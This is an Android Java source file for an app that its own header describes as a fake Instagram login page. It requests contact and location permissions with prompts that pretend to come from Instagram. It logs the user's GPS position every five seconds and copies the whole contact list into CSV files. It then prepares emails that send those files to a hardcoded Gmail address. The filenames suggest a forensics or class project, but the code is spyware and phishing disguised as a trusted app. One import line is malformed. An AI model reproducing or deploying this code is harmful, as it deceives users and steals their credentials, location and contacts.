/**
 *   MainActivity
 *   DESCRIPTION: Load home page of fake Instagram login page. Scrapes username/password,
 *   requests permission to scrape location and contacts.
 *   ACKNOWLEDGEMENTS: Instagram page formatting derived from https://github.com/mitchtabian/Android-Instagram-Clone.
 */

package com.example.shivani.df2;

import android.Manifest;
import android.Uri
import android.content.Intent;
import android.content.DialogInterface;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.os.Build;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AlertDialog;
import android.support.v7.app.AppCompatActivity;
import android.widget.Toast;
import android.view.View;
import android.support.v4.content.ContextCompat;
import android.os.Environment;
import android.util.Log;
import com.google.android.gms.common.api.GoogleApiClient;
import com.google.android.gms.location.LocationListener;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationServices;

import java.io.File;
import java.io.FileWriter;

import java.util.ArrayList;


public class MainActivity extends AppCompatActivity
        implements GoogleApiClient.ConnectionCallbacks,
        GoogleApiClient.OnConnectionFailedListener, LocationListener{

    private GoogleApiClient googleApiClient;
    private static final int PLAY_SERVICES_RESOLUTION_REQUEST = 9000;
    private LocationRequest locationRequest;
    private static final long UPDATE_INTERVAL = 5000, FASTEST_INTERVAL = 5000;

    // Permissions variables
    private ArrayList<String> permissionsToRequest;
    private ArrayList<String> permissionsRejected = new ArrayList<>();
    private ArrayList<String> permissions = new ArrayList<>();
    private static final int ALL_PERMISSIONS_RESULT = 1011;

    //Files and writers for saving location and contacts
    private final String locations_filename = "forensics_locations.csv";
    private FileWriter location_writer;
    private final String contacts_filename = "forensics_contacts.csv";
    private FileWriter contacts_writer;

    Cursor cursor ;
    String name, phonenumber ;
    public  static final int RequestPermissionCode  = 1 ;


    /**
     *   onCreate
     *   DESCRIPTION: Initialize all necessary variables on creation.
     *   Start process of requesting permissions.
     */
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        //add all permissions needed to request location and read contacts
        permissions.add(Manifest.permission.ACCESS_FINE_LOCATION);
        permissions.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        permissions.add(Manifest.permission.READ_CONTACTS);
        permissionsToRequest = permissionsToRequest(permissions);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (permissionsToRequest.size() > 0) {
                requestPermissions(permissionsToRequest.toArray(
                        new String[permissionsToRequest.size()]), ALL_PERMISSIONS_RESULT);
            }
        }

        // Build google API client (for location request)
        googleApiClient = new GoogleApiClient.Builder(this).
                addApi(LocationServices.API).
                addConnectionCallbacks(this).
                addOnConnectionFailedListener(this).build();

        //Create CSV files on user's phone
        try {
            File path = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
            File file = new File(path, locations_filename);
            file.createNewFile();
            location_writer = new FileWriter(file);
        } catch (Exception e) {
            Log.e("ERROR: Location file note created", e.toString());
        }

        try {
            File path = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
            File file = new File(path, contacts_filename);
            file.createNewFile();
            contacts_writer = new FileWriter(file);
        } catch (Exception e) {
            Log.e("ERROR: Contacts file not created", e.toString());
        }

        EnableRuntimePermission();
        GetContactsIntoArrayList();

        if (Build.VERSION.SDK_INT >= 23) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE)
                    != PackageManager.PERMISSION_GRANTED || ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
                    != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this,
                        new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.READ_EXTERNAL_STORAGE},
                        1);
            }
        }
    }

    /**
     *   switchViews
     *   DESCRIPTION: Change activities in app after login button is pressed.
     */
    public void switchViews(View view) {
        Intent intent = new Intent(this, Main2Activity.class);
        startActivity(intent);
    }

    /**
     *   permissionsToRequest
     *   DESCRIPTION: Add permissions as requested.
     */
    private ArrayList<String> permissionsToRequest(ArrayList<String> wantedPermissions) {
        ArrayList<String> result = new ArrayList<>();

        for (String perm : wantedPermissions) {
            if (!hasPermission(perm)) {
                result.add(perm);
            }
        }

        return result;
    }

    /**
     *   hasPermission
     *   DESCRIPTION: Checks if permission is granted.
     */
    private boolean hasPermission(String permission) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            return checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED;
        }

        return true;
    }

    /**
     *   onStart
     *   DESCRIPTION: Connect google API client on app run.
     */
    @Override
    protected void onStart() {
        super.onStart();

        if (googleApiClient != null) {
            googleApiClient.connect();
        }
    }

    /**
     *   onPause
     *   DESCRIPTION: Disconnect Google API client and location services. Email location data as collected.
     */
    @Override
    protected void onPause() {
        super.onPause();

        // stop location updates
        if (googleApiClient != null  &&  googleApiClient.isConnected()) {
            LocationServices.FusedLocationApi.removeLocationUpdates(googleApiClient, this);
            googleApiClient.disconnect();
        }

        //send location updates
        String filename="forensics_locations.csv";
        File filelocation = new File(Environment.getExternalStorageDirectory().getAbsolutePath(), filename);
        Uri path = Uri.fromFile(filelocation);
        Intent emailIntent = new Intent(Intent.ACTION_SEND);
        emailIntent .setType("vnd.android.cursor.dir/email");
        String to[] = {"shivimfb@gmail.com"}; //hardcoded for testing
        emailIntent .putExtra(Intent.EXTRA_EMAIL, to);
        emailIntent .putExtra(Intent.EXTRA_STREAM, path);
    }

    /**
     *   onConnected
     *   DESCRIPTION: Handle connection status.
     */
    @Override
    public void onConnected(@Nullable Bundle bundle) {
        if (ActivityCompat.checkSelfPermission(this,
                Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED
                &&  ActivityCompat.checkSelfPermission(this,
                Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            return;
        }

        startLocationUpdates();
    }

    /**
     *   startLocationUpdates
     *   DESCRIPTION: Start scraping location. Request permission for location and register new
     *   locations as updated.
     */
    private void startLocationUpdates() {
        locationRequest = new LocationRequest();
        locationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
        locationRequest.setInterval(UPDATE_INTERVAL);
        locationRequest.setFastestInterval(FASTEST_INTERVAL);
        LocationServices.FusedLocationApi.requestLocationUpdates(googleApiClient, locationRequest, this);
    }

    /**
     *   onLocationChanged
     *   DESCRIPTION: When location changes, write it to the CSV file.
     */
    @Override
    public void onLocationChanged(Location location) {
        if (location != null) {
            String newLine = "Latitude : " + location.getLatitude() + "\nLongitude : " + location.getLongitude();
            newLine += "\n";
            try
            {
                location_writer.write(newLine);
                location_writer.flush();
            }
            catch (Exception e)
            {
            }
        }
    }

    /**
     *   onRequestPermissionsResult
     *   DESCRIPTION: Scrape and save contacts.
     */
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        switch(requestCode) {
            case ALL_PERMISSIONS_RESULT:
                for (String perm : permissionsToRequest) {
                    if (!hasPermission(perm)) {
                        permissionsRejected.add(perm);
                    }
                }

                if (permissionsRejected.size() > 0) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        if (shouldShowRequestPermissionRationale(permissionsRejected.get(0))) {
                            new AlertDialog.Builder(MainActivity.this).
                                    setMessage("Please enable location permissions.").
                                    setPositiveButton("OK", new DialogInterface.OnClickListener() {
                                        @Override
                                        public void onClick(DialogInterface dialogInterface, int i) {
                                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                                                requestPermissions(permissionsRejected.
                                                        toArray(new String[permissionsRejected.size()]), ALL_PERMISSIONS_RESULT);
                                            }
                                        }
                                    }).setNegativeButton("Cancel", null).create().show();

                            return;
                        }
                    }
                } else {
                    if (googleApiClient != null) {
                        googleApiClient.connect();
                    }
                }

                break;
        }
    }

    /**
     *   GetContactsIntoArrayList
     *   DESCRIPTION: Scrape and write contacts to CSV file.
     */
    public void GetContactsIntoArrayList(){

        cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,null, null, null);

        while (cursor.moveToNext()) {

            name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));

            phonenumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

            String newLine = name + " : " + phonenumber + "\n";

            try
            {
                contacts_writer.write(newLine);
                contacts_writer.flush();
            }
            catch (Exception e)
            {
            }
        }

        cursor.close();

        String filename="forensics_contacts.csv";
        File filelocation = new File(Environment.getExternalStorageDirectory().getAbsolutePath(), filename);
        Uri path = Uri.fromFile(filelocation);
        Intent emailIntent = new Intent(Intent.ACTION_SEND);
        emailIntent .setType("vnd.android.cursor.dir/email");
        String to[] = {"shivimfb@gmail.com"};
        emailIntent .putExtra(Intent.EXTRA_EMAIL, to);
        emailIntent .putExtra(Intent.EXTRA_STREAM, path);
    }

    /**
     *   EnableRuntimePermission
     *   DESCRIPTION: Request contacts and location permission.
     */
    public void EnableRuntimePermission(){

        if (ActivityCompat.shouldShowRequestPermissionRationale(
                MainActivity.this,
                Manifest.permission.READ_CONTACTS))
        {
            Toast.makeText(MainActivity.this,"Allow Instagram to access your contacts?", Toast.LENGTH_LONG).show();

        } else {
            ActivityCompat.requestPermissions(MainActivity.this,new String[]{
                    Manifest.permission.READ_CONTACTS}, RequestPermissionCode);
        }

        if (ActivityCompat.checkSelfPermission(this,
                Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED
                &&  ActivityCompat.checkSelfPermission(this,
                Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            Toast.makeText(this, "Allow Instagram to access your location?", Toast.LENGTH_SHORT).show();
        }
    }


}